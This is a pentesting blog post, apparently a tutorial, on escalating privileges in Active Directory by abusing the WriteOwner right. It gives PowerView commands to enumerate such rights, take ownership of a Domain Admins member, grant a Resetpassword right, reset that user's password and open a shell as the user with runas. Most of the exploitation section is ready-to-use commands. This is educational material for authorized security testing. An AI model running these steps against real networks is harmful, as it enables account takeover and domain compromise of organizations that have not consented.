---
title:  WriteOwner On User
date: 2022-06-03 05:49:33 +0800
categories: [Infrastructure Pentesting, Active Directory]
tags: []  
---

# WriteOwner

***WriteOwner*** : Is a permission that allows you to change ownership of an object. If you have *WriteOwner* on user object, you can make yourself the owner of that user, and if you have ownership on user object, you can give yourself a right i.e `Resetpassword` that will allow you to reset user's password, thereby escalating your privileges.

# Enumeration

## PowerView

### WriteOwner Enumeration 

Get your current user's sid by executing `whoami /user`, import powerview, then execute the below command to get the list of objects on which you have *WriteOwner* right.

Command
```powershell

get-objectacl -resolveguids | ? {($_.securityidentifier -eq "[your_current_user_sid]") -and ($_.activedirectoryrights -like "*WriteOwner*")}

```

*below image shows the current user `usman` has WriteOwner right on user object `ali`*

![userace](https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/acluserwriteownerenum1.png)

### User Enumeration

Execute the below command to get more information about the target user.

Command

```powershell

get-netuser [target_user]

```
*below image shows the target user `ali` is a member of `Domain Admins`*

![userace](https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/aclusergenallenum2.png)

## BloodHound

You can also get thesame result using bloodhound.

*below image shows the current user `usman` has WriteOwner right on user object `ali` who is a member of `Domain Admins`*

![userace](https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/acluserwriteowner.png)

# Exploitation

## PowerView

### Change Ownership Of User

Execute the below command to give yourself ownership on the target user `ali`.

Command

```powershell

set-domainobjectowner -Identity [target_user] -OwnerIdentity [Your Current User]

```
![userace](https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/acluserwriteownerenum2.png)

You can verify it using bloodhound

*below image shows user `usman` is owner of user `ali`*

![userace](https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/acluserwriteownerb.png)

You can verify it from server manager

*below image shows user `usman` is owner of user `ali`*

![userace](https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/acluserwriteownerenum3.png)

### Give Resetpassword Right

Since you are the owner of the user `ali`, you can execute the below command to give yourself `Resetpassword` right on the user.

Command

```powershell

add-domainobjectacl -TargetIdentity [target_user] -PrincipalIdentity [Your Current User] -Rights Resetpassword

```
You can verify it using the below command.

Command

```powershell

get-objectacl -resolveguids | ? {$_.securityidentifier -eq "[your_current_user_sid]"}

```

![userace](https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/acluserwriteownerenum4.png)

### Reset Password

With `resetpassword` right given, you can reset his password and login to his account by executing the below command

Command

```powershell

$pass = ConvertTo-SecureString '[Your New Password Here]' -AsPlainText -Force
set-domainuserpassword -identity [target_user] -accountpassword $pass 
runas /user:[domain\user] cmd.exe
```

![userace](https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/aclusergenallenum3.png)

# References

- [https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse)
